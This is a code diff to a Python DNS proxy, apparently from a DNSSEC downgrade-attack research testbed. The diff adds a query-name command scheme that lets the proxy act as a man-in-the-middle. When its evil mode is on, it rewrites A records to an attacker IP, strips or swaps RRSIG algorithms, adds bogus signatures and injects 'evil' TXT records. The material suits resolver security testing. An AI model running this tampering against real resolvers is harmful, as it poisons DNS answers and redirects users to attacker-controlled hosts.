@@ -5,10 +5,12 @@ import socket
 import socketserver
 import struct
 import traceback
-from typing import Set, Optional
+from typing import Optional, List
 
+import dns.dnssec
 import dns.message
 import dns.query
+import dns.rdtypes.ANY
 import dns.rrset
 
 IN = dns.rdataclass.from_text("IN")
@@ -28,36 +30,142 @@ def indent(s, l=4):
     return " " * l + s.replace("\n", "\n" + " " * l)
 
 
-def filter_signatures(a: dns.message.QueryMessage, algs: Set[int] = None):
-    algs = algs or {15}
+def filter_response(a: dns.message.QueryMessage):
     qname = a.question[0].name
-    if qname[0] == b'unsign':
-        algs = {}
-    elif qname[0] == b'unsign-and-attach':
-        algs = {}
+    if not qname[0].startswith(b'mitm'):
+        return
+
+    def replace_rrsig_algo(section: List, replace_with):
+        replace_with = dns.dnssec.Algorithm(int(replace_with))
+        rrsigs = [rrset for rrset in section if rrset.rdtype == RRSIG]
+        for rrsig in rrsigs:
+            section.remove(rrsig)
+            new_rrsig = dns.rrset.RRset(name=rrsig.name, rdclass=rrsig.rdclass, rdtype=rrsig.rdtype, covers=rrsig.covers)
+            section.append(new_rrsig)
+            for rr in rrsig:
+                new_rrsig.add(dns.rdtypes.ANY.RRSIG.RRSIG(
+                    rdclass=rr.rdclass,
+                    rdtype=rr.rdtype,
+                    type_covered=rr.type_covered,
+                    algorithm=replace_with,
+                    labels=rr.labels,
+                    original_ttl=rr.original_ttl,
+                    expiration=rr.expiration,
+                    inception=rr.inception,
+                    key_tag=rr.key_tag,
+                    signer=rr.signer,
+                    signature=rr.signature,
+                ))
+
+    def replace_a(section, *args):
+        a_rrsets = [rrset for rrset in section if rrset.rdtype == A]
+        for a in a_rrsets:
+            section.remove(a)
+            new_a = dns.rrset.RRset(name=a.name, rdclass=a.rdclass, rdtype=a.rdtype, covers=a.covers)
+            section.append(new_a)
+            new_a.add(dns.rdtypes.IN.A.A(
+                rdclass=a[0].rdclass,
+                rdtype=a[0].rdtype,
+                address=IP_A_EVIL,
+            ))
+
+    def drop_rrsigs(section, algorithm):
+        algorithm = dns.dnssec.Algorithm(int(algorithm))
+        rrsigs = [rrset for rrset in section if rrset.rdtype == RRSIG]
+        for rrsig in rrsigs:
+            section.remove(rrsig)
+            new_rrsig = dns.rrset.RRset(name=rrsig.name, rdclass=rrsig.rdclass, rdtype=rrsig.rdtype, covers=rrsig.covers)
+            for rr in rrsig:
+                if rr.algorithm != algorithm:
+                    new_rrsig.add(dns.rdtypes.ANY.RRSIG.RRSIG(
+                        rdclass=rr.rdclass,
+                        rdtype=rr.rdtype,
+                        type_covered=rr.type_covered,
+                        algorithm=rr.algorithm,
+                        labels=rr.labels,
+                        original_ttl=rr.original_ttl,
+                        expiration=rr.expiration,
+                        inception=rr.inception,
+                        key_tag=rr.key_tag,
+                        signer=rr.signer,
+                        signature=rr.signature,
+                    ))
+            if len(new_rrsig) > 0:
+                section.append(new_rrsig)
+
+    def add_bogus_rrsig(section, algorithm):
+        algorithm = dns.dnssec.Algorithm(int(algorithm))
+        rrsigs = [rrset for rrset in section if rrset.rdtype == RRSIG]
+        for rrsig in rrsigs:
+            section.remove(rrsig)
+            new_rrsig = dns.rrset.RRset(name=rrsig.name, rdclass=rrsig.rdclass, rdtype=rrsig.rdtype, covers=rrsig.covers)
+            section.append(new_rrsig)
+            for rr in rrsig:
+                new_rrsig.add(dns.rdtypes.ANY.RRSIG.RRSIG(
+                    rdclass=rr.rdclass,
+                    rdtype=rr.rdtype,
+                    type_covered=rr.type_covered,
+                    algorithm=rr.algorithm,
+                    labels=rr.labels,
+                    original_ttl=rr.original_ttl,
+                    expiration=rr.expiration,
+                    inception=rr.inception,
+                    key_tag=rr.key_tag,
+                    signer=rr.signer,
+                    signature=rr.signature,
+                ))
+            new_rrsig.add(dns.rdtypes.ANY.RRSIG.RRSIG(
+                rdclass=rr.rdclass,
+                rdtype=rr.rdtype,
+                type_covered=rr.type_covered,
+                algorithm=algorithm,
+                labels=rr.labels,
+                original_ttl=rr.original_ttl,
+                expiration=rr.expiration,
+                inception=rr.inception,
+                key_tag=rr.key_tag,
+                signer=rr.signer,
+                signature=b"\xff" * 24,
+            ))
+
+    def add_bogus_txt(section, *args):
+        txts = [rrset for rrset in section if rrset.rdtype == TXT]
+        for txt in txts:
+            section.remove(txt)
+            new_txt = dns.rrset.RRset(name=txt.name, rdclass=txt.rdclass, rdtype=txt.rdtype, covers=txt.covers)
+            section.append(new_txt)
+            for rr in txt:
+                new_txt.add(dns.rdtypes.ANY.TXT.TXT(
+                    rdclass=rr.rdclass,
+                    rdtype=rr.rdtype,
+                    strings=rr.strings,
+                ))
+            new_txt.add(dns.rdtypes.ANY.TXT.TXT(
+                rdclass=rr.rdclass,
+                rdtype=rr.rdtype,
+                strings=(b"evil",),
+            ))
+
+    instruction_codes = {
+        'rs': replace_rrsig_algo,
+        'ra': replace_a,
+        'ds': drop_rrsigs,
+        'as': add_bogus_rrsig,
+        'at': add_bogus_txt,
+        'mitm': lambda *args: None,  # no-op
+    }
+
+    actions = [
+        (f, instruction[len(ic):])
+        for instruction in qname[0].decode().split('-')
+        for ic, f in instruction_codes.items()
+        if instruction.startswith(ic)
+    ]
 
     def filter_section(section):
-        filtered_section = []
-        for rrset in section:
-            rrset: dns.rrset.RRset = rrset
-            if rrset.rdtype == dns.rdatatype.RdataType.RRSIG:
-                filtered_rrset: dns.rrset.RRset = rrset.copy()
-                for rr in rrset.items:
-                    if rr.algorithm not in algs:
-                        filtered_rrset.remove(rr)
-                filtered_section.append(filtered_rrset)
-                logger.info(f"Filtered {len(rrset) - len(filtered_rrset)} signatures from {dns.rdatatype.to_text(rrset.covers)} {rrset.name}")
-            else:
-                if rrset.rdtype == dns.rdatatype.RdataType.TXT:
-                    filtered_section.append(dns.rrset.from_text_list(rrset.name, rrset.ttl, IN, TXT, ['evil']))
-                    if qname[0] == b'unsign-and-attach':
-                        invalid_signature = "TXT 16 4 0 20211007155444 20210923142444 10717 rsasha256.resolver-downgrade-attack.dedyn.io. 9zvUve6RuNC1NcAvTIH+kh6VXVOmIu347s/6ilIRp0rSq1YqldE09Tdm Ue/6i4HxdUbnLWfdpD+AhtvDwp7ZIO/FU7IRWgyne6v+RcYApLwLT2+L DQgEH5fFwnY60H6ofxHSP2zwT6amhqPSd7G5ihYA"
-                        filtered_section.append(dns.rrset.from_text_list(rrset.name, rrset.ttl, IN, RRSIG, [invalid_signature]))
-                elif rrset.rdtype == dns.rdatatype.RdataType.A:
-                    filtered_section.append(dns.rrset.from_text_list(rrset.name, rrset.ttl, IN, A, [IP_A_EVIL]))
-                    continue
-                filtered_section.append(rrset)
-        return filtered_section
+        for action, arg in actions:
+            action(section, arg)
+        return section
 
     a.answer = filter_section(a.answer)
     a.authority = filter_section(a.authority)
@@ -78,11 +186,8 @@ def digest(message: bytes, host: str, port: int) -> Optional[bytes]:
     logger.info(f"Received upstream answer for {q.id}, {host}:{port} ...")
     logger.info(indent(a.to_text()))
 
-    accept_algorithm = {15, 16}  # ed25519, ed448
-
-    if BE_EVIL and accept_algorithm:
-        logger.info(f"Filtering for signatures to match {accept_algorithm}")
-        filter_signatures(a, accept_algorithm)
+    if BE_EVIL:
+        filter_response(a)
 
     logger.info(f"Forwarding answer {q.id} for {host}:{port} ...")
     logger.info(indent(a.to_text()))
